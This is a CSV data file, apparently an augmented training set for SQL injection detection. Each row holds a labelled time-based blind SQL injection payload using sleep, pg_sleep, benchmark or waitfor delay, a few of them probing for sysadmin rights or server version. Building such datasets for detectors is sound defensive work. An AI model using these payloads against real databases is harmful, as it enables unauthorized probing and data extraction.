id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_001875,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.3685284343456835
SMOTE_001876,attack,time,"1""  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000075,1.1447660190197815
SMOTE_001877,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,1.662888210066517
SMOTE_001878,attack,time,"1""   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000044,0.5460466260712942
SMOTE_001879,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000084,0.8168640737136937
SMOTE_001880,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,nearest_attack_euclidean,R000086,0.975892814387565
SMOTE_001881,attack,time,1 where 6223  =  6223 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000131,0.9959654667411487
SMOTE_001882,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,0.05918025725275986
SMOTE_001883,attack,time,"1""   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000056,1.1943989207674583
SMOTE_001884,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000035,0.20504638895015903
SMOTE_001885,attack,time,1'+  (  select ophz where 9158  =  9158 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',nearest_attack_euclidean,R000148,1.330999921945938
SMOTE_001886,attack,time,"select sleep  (  5  )   and ""%""  =  """,nearest_attack_euclidean,R000116,2.1858265990937786
SMOTE_001887,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,1.1835365016118864
SMOTE_001888,attack,time,"select sleep  (  5  )   and ""%""  =  """,nearest_attack_euclidean,R000116,0.4961594995493958
SMOTE_001889,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000034,2.226328304824783
SMOTE_001890,attack,time,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  -- ybmz,nearest_attack_euclidean,R000150,1.52973023838567
SMOTE_001891,attack,time,"waitfor delay '0:0:5' and   (  ""ludp"" like ""ludp",nearest_attack_euclidean,R000099,2.2285662615739206
SMOTE_001892,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baia""  =  ""baia",nearest_attack_euclidean,R000046,0.46254135115966544
SMOTE_001893,attack,time,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'xwsb'  =  'xwsb",nearest_attack_euclidean,R000147,0.33001930653998357
SMOTE_001894,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'nbzf' like 'nbzf,nearest_attack_euclidean,R000097,1.2208033612463405
SMOTE_001895,attack,time,"select sleep  (  5  )   and ""%""  =  """,nearest_attack_euclidean,R000116,0.5900189937483235
SMOTE_001896,attack,time,begin dbms_lock.sleep  (  5  ) ,nearest_attack_euclidean,R000140,1.7879058500619698
SMOTE_001897,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000093,1.3185504937778414
SMOTE_001898,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.6341565058116221
SMOTE_001899,attack,time,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000077,0.9169839543250077
SMOTE_001900,attack,time,1'+  (  select ophz where 9158  =  9158 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',nearest_attack_euclidean,R000148,0.9876331655444602
SMOTE_001901,attack,time,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar",nearest_attack_euclidean,R000095,1.9576851875369352
SMOTE_001902,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.8728990289653396
SMOTE_001903,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,0.17753289862902744
SMOTE_001904,attack,time,"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",nearest_attack_euclidean,R000154,1.8763628193795048
SMOTE_001905,attack,time,"1""   )    )    as klie where 2840  =  2840 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000052,1.51987250889701
SMOTE_001906,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.5973272409022673
SMOTE_001907,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,0.17420147551628
SMOTE_001908,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,0.5435990554962554
SMOTE_001909,attack,time,1'   )    )    as qgyz where 1547  =  1547 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000151,0.3256349913962225
SMOTE_001910,attack,time,"1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000054,0.610291746274536
SMOTE_001911,attack,time,"1'   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000109,0.0475767744259601
SMOTE_001912,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000146,0.08778157480717878
SMOTE_001913,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,1.5040707251404157
SMOTE_001914,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.009376610987687333
SMOTE_001915,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R000096,0.5838481332914219
SMOTE_001916,attack,time,1'  )   where 7908  =  7908 or sleep  (  5  )  --,nearest_attack_euclidean,R000103,0.929988116577066
SMOTE_001917,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000134,1.1070751069343672
SMOTE_001918,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.5456064525612603
SMOTE_001919,attack,time,1'  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000068,1.858220036772121
SMOTE_001920,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,1.0199358955021784
SMOTE_001921,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R000096,1.1606046243138253
SMOTE_001922,attack,time,"waitfor delay '0:0:5' and   (  ""ludp"" like ""ludp",nearest_attack_euclidean,R000099,0.7952199929559246
SMOTE_001923,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.004549751487000464
SMOTE_001924,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,2.4382116302133316
SMOTE_001925,attack,time,1' waitfor delay '0:0:5'--,nearest_attack_euclidean,R000156,1.4973095782309627
SMOTE_001926,attack,time,"1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000066,1.773723910139392
SMOTE_001927,attack,time,""" or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000040,0.3743920104644136
SMOTE_001928,attack,time,"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000073,2.402627977246421
SMOTE_001929,attack,time,"1'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000126,1.9259961275121675
SMOTE_001930,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000110,2.073738057342829
SMOTE_001931,attack,time,1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000059,1.6073784424006239
SMOTE_001932,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,0.9492361202197375
SMOTE_001933,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000035,1.2445910658338055
SMOTE_001934,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.4526974100590185
SMOTE_001935,attack,time,"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""ijag""  =  ""ijag",nearest_attack_euclidean,R000108,1.4810348251127319
SMOTE_001936,attack,time,1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like 'uzhd,nearest_attack_euclidean,R000112,0.5565469474367533
SMOTE_001937,attack,time,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cneo"" like ""cneo",nearest_attack_euclidean,R000076,0.6201639109327626
SMOTE_001938,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond",nearest_attack_euclidean,R000119,1.0826362034988015
SMOTE_001939,attack,time,"1   )    )    as cusv where 4871  =  4871 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000123,1.112674011664767
SMOTE_001940,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000034,2.6797985452205695
SMOTE_001941,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,0.5320279706296741
SMOTE_001942,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baia""  =  ""baia",nearest_attack_euclidean,R000046,0.14549403994339113
SMOTE_001943,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.4100778384810523
SMOTE_001944,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.22578378880897818
SMOTE_001945,attack,time,select sleep  (  5  )   and   (  'dcys' like 'dcys,nearest_attack_euclidean,R000135,2.4589971018109287
SMOTE_001946,attack,time,1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,nearest_attack_euclidean,R000089,1.0273190308831983
SMOTE_001947,attack,time,"1""  )   where 7165  =  7165 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000118,0.39547878675936526
SMOTE_001948,attack,time,"1""  )   as gdcx where 2335  =  2335 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000142,0.23494059454565008
SMOTE_001949,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,0.15218644376654325
SMOTE_001950,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,1.7315793627216582
SMOTE_001951,attack,time,"1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000067,1.547791637048747
SMOTE_001952,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.18778164073184786
SMOTE_001953,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,1.5760641431630724
SMOTE_001954,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,1.1798120433580286
SMOTE_001955,attack,time,1'+  (  select mavu where 4276  =  4276 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000115,0.4647266696853176
SMOTE_001956,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,0.679618023000647
SMOTE_001957,attack,time,"1""   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000056,1.0960037392382411
SMOTE_001958,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,1.227258367942547
SMOTE_001959,attack,time,"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",nearest_attack_euclidean,R000154,1.1147556147495223
SMOTE_001960,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,1.0290808712680872
SMOTE_001961,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.17879819730005264
SMOTE_001962,attack,time,"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000073,1.4540479751477497
SMOTE_001963,attack,time,1  )   as cwsi where 7360  =  7360 or sleep  (  5  )  #,nearest_attack_euclidean,R000124,0.6557922875532212
SMOTE_001964,attack,time,1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'wevl'  =  'wevl,nearest_attack_euclidean,R000104,1.4784389758553942
SMOTE_001965,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baia""  =  ""baia",nearest_attack_euclidean,R000046,1.6159024409544636
SMOTE_001966,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,2.496342030659138
SMOTE_001967,attack,time,"1"" rlike sleep  (  5  )   and ""veub""  =  ""veub",nearest_attack_euclidean,R000143,0.7333969472046383
SMOTE_001968,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.06938382410595277
SMOTE_001969,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.2536343231339411
SMOTE_001970,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   # igen",nearest_attack_euclidean,R000080,0.17688247562802237
SMOTE_001971,attack,time,select sleep  (  5  )   and   (  'dcys' like 'dcys,nearest_attack_euclidean,R000135,0.3884885823738174
SMOTE_001972,attack,time,1  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000088,1.8886244189235037
SMOTE_001973,attack,time,1 and sleep  (  5  )  -- ruuv,nearest_attack_euclidean,R000107,1.5121403947985925
SMOTE_001974,attack,time,1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'jrpk'  =  'jrpk,nearest_attack_euclidean,R000092,0.7203782684913237
SMOTE_001975,attack,time,1%'   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R000113,1.5106395884939807
SMOTE_001976,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'nbzf' like 'nbzf,nearest_attack_euclidean,R000097,1.2406511924065426
SMOTE_001977,attack,time,1'||  (  select 'tfqg' from dual where 9862  =  9862 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000060,0.4594043342442049
SMOTE_001978,attack,time,1'  )   as inid where 7812  =  7812 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000136,1.1196991713923115
SMOTE_001979,attack,time,"1""   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000056,0.7576123862981862
SMOTE_001980,attack,time,"1""   )    )    as klie where 2840  =  2840 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000052,1.311253830434314
SMOTE_001981,attack,time,1  )   as hlcn where 1165  =  1165 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000153,0.995285205625715
SMOTE_001982,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,0.3597916481802173
SMOTE_001983,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000114,0.9398146500895241
SMOTE_001984,attack,time,"1   )    )    as cusv where 4871  =  4871 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000123,1.2257429661620485
SMOTE_001985,attack,time,select pg_sleep  (  5  )  -- ojzt,nearest_attack_euclidean,R000139,0.22607206071653826
SMOTE_001986,attack,time,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000077,2.356898071200161
SMOTE_001987,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,0.6817891758488765
SMOTE_001988,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.8397944072901822
SMOTE_001989,attack,time,1 and sleep  (  5  )  -- ruuv,nearest_attack_euclidean,R000107,1.1959621960505613
SMOTE_001990,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.2207458393678663
SMOTE_001991,attack,time,"1""   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000044,0.9601163036026306
SMOTE_001992,attack,time,"1'   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000109,0.487302701023368
SMOTE_001993,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000084,0.5776651045851552
